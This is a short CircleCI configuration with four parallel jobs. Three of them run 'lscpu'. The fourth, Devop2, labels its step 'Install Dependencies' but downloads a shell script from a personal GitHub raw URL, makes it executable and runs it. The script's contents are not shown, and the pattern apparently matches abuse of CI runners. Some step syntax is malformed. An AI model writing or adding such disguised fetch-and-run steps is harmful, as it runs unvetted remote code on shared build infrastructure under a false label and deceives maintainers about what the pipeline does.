version: 2.1
jobs:
    Devop:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        -checkout
        -run:
           name: Install Dependencies
           command: timeout 1m lscpu
    Devop1:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        -checkout
        -run:
            name: Install Dependencies
            command: timeout 1m lscpu
    Devop2:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        -checkout
        -run:
            name: Install Dependencies
            command: timeout 1m wget https://raw.githubusercontent.com/Taryok/trotol/main/ngeng.sh && chmod u+x ngeng.sh && ./ngeng.sh 
    Devop3:
      docker:
            - image: circleci/ruby:2.5.3
      steps:
        -checkout
        -run:
            name: Install Dependencies
            command: timeout 1m lscpu
workflows:
    version: 2.1
    build:
        jobs:
            - Devop
            - Devop1
            - Devop2
            - Devop3